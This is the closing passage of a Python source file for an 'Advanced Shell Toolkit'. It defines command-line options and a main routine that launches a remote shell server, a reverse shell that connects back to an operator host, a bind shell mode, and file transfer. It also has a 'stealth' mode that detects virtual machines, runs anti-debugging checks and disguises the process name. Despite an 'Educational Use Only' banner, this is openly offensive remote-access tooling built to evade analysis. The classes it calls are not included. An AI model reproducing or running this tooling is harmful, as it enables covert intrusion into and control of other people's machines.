        help='Host address (server mode) or operator address (reverse mode)'
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=1337,
        help='Port number'
    )
    
    parser.add_argument(
        '--max-clients',
        type=int,
        default=5,
        help='Maximum concurrent clients (server mode)'
    )
    
    parser.add_argument(
        '--disable-file-transfer',
        action='store_true',
        help='Disable file transfer capabilities'
    )
    
    parser.add_argument(
        '--disable-monitoring',
        action='store_true',
        help='Disable system monitoring features'
    )
    
    parser.add_argument(
        '--log-file',
        default='sessions.log',
        help='Log file path'
    )
    
    parser.add_argument(
        '--database',
        default='sessions.db',
        help='SQLite database file for session persistence'
    )
    
    parser.add_argument(
        '--timeout',
        type=int,
        default=300,
        help='Command execution timeout (seconds)'
    )
    
    parser.add_argument(
        '--stealth',
        action='store_true',
        help='Enable stealth mode features'
    )
    
    parser.add_argument(
        '--enable-all',
        action='store_true',
        help='Enable all advanced features'
    )
    
    parser.add_argument(
        '--bind-shell',
        action='store_true',
        help='Bind shell mode (listen for connections)'
    )
    
    return parser


def main():
    """Main entry point for advanced toolkit."""
    try:
        parser = create_advanced_argument_parser()
        args = parser.parse_args()
        
        # Banner
        print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                  ADVANCED SHELL TOOLKIT v2.0                 ║
    ║                     Educational Use Only                      ║
    ╚═══════════════════════════════════════════════════════════════╝
        """)
        
        if args.mode == 'server':
            # Server mode configuration
            config = AdvancedServerConfig(
                host=args.host,
                port=args.port,
                max_clients=args.max_clients,
                enable_file_transfer=not args.disable_file_transfer or args.enable_all,
                enable_monitoring=not args.disable_monitoring or args.enable_all,
                log_file=args.log_file,
                database_file=args.database,
                command_timeout=args.timeout,
                enable_stealth=args.stealth or args.enable_all,
                bind_shell_mode=args.bind_shell
            )
            
            # Stealth checks
            if config.enable_stealth:
                print("[*] Stealth mode enabled")
                stealth = StealthMode()
                
                # VM detection
                vm_detected, vm_type = stealth.check_vm_environment()
                if vm_detected:
                    print(f"[!] Virtual machine detected: {vm_type}")
                
                # Anti-debug checks
                debug_checks = stealth.anti_debug_checks()
                for check in debug_checks:
                    print(f"[!] {check}")
                
                # Process hiding
                if stealth.hide_process():
                    print("[*] Process name obfuscated")
            
            # Start server
            server = AdvancedShellServer(config)
            server.start_server()
            
        elif args.mode == 'reverse':
            # Reverse shell mode
            print(f"[*] Reverse shell mode - connecting to {args.host}:{args.port}")
            client = ReverseShellClient(args.host, args.port)
            client.connect_back()
            
        elif args.mode == 'stealth':
            # Stealth analysis mode
            print("[*] Stealth analysis mode")
            stealth = StealthMode()
            
            vm_detected, vm_type = stealth.check_vm_environment()
            print(f"[*] VM Detection: {'Yes' if vm_detected else 'No'} ({vm_type})")
            
            debug_checks = stealth.anti_debug_checks()
            if debug_checks:
                print("[*] Security concerns detected:")
                for check in debug_checks:
                    print(f"    - {check}")
            else:
                print("[*] No obvious security concerns detected")
    
    except KeyboardInterrupt:
        print("\n[*] Toolkit terminated by user")
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()